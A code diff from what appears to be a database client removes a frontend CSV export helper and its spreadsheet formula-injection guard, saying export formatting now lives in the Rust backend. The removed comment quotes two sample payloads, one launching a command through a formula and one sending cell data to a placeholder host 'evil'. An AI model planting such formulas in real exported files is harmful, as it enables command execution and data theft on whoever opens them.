@@ -8,8 +8,8 @@
  * a write, and as a spurious UPDATE staged for a cell nobody edited.
  *
  * Every call site had to answer this and they did not all answer it the same
- * way, so it lives here once. The two exported functions differ only in what a
- * null is: on screen it is worth seeing, in a CSV field it is emptiness.
+ * way, so it lives here once. (Export files are formatted in the backend —
+ * src-tauri/src/export.rs — where a null is an empty field instead.)
  */
 
 /** The shared rule, for a value already known not to be null or undefined. */
@@ -26,38 +26,6 @@ function text(v: NonNullable<unknown>): string {
  *  empty string are different facts and the grid should not hide which. */
 export function cellText(v: unknown): string {
   return v === null || v === undefined ? "null" : text(v);
-}
-
-/** A cell as it should be written to a file, where a null is an empty field —
- *  the convention every spreadsheet expects. */
-export function cellExport(v: unknown): string {
-  return v === null || v === undefined ? "" : text(v);
-}
-
-/**
- * A cell value made safe against spreadsheet formula injection (CSV injection).
- *
- * Excel, Google Sheets and LibreOffice treat a cell whose first character is
- * `= + - @` (or a leading TAB / CR) as a *formula*, not text. A database row
- * value like `=cmd|'/c calc'!A1` or `=HYPERLINK("http://evil/?"&A1,"x")` then
- * executes or exfiltrates when the exported file is opened — and RFC-4180
- * quoting does not help, because `="..."` still parses as a formula. Row data
- * in a DB client is frequently attacker-influenced, so this is a real path
- * (security review FILE-01).
- *
- * The fix is OWASP's: prefix the offending cell with a single quote, which
- * spreadsheets treat as "the rest is literal text." This mutates the exported
- * value, so it is opt-out via the "raw" export mode.
- */
-const FORMULA_PREFIX = /^[=+\-@\t\r]/;
-/** A plain number, which a spreadsheet reads as a number, not a formula. */
-const PLAIN_NUMBER = /^[-+]?(\d+\.?\d*|\.\d+)([eE][-+]?\d+)?$/;
-export function neutralizeFormula(value: string): string {
-  // `-5` is a number, not a formula. Prefixing it made every negative value
-  // text in Excel; anything more than a bare number (`-2+3`, `-A1`) still is
-  // a formula and is still neutralised.
-  if (PLAIN_NUMBER.test(value)) return value;
-  return FORMULA_PREFIX.test(value) ? `'${value}` : value;
 }
 
 /**
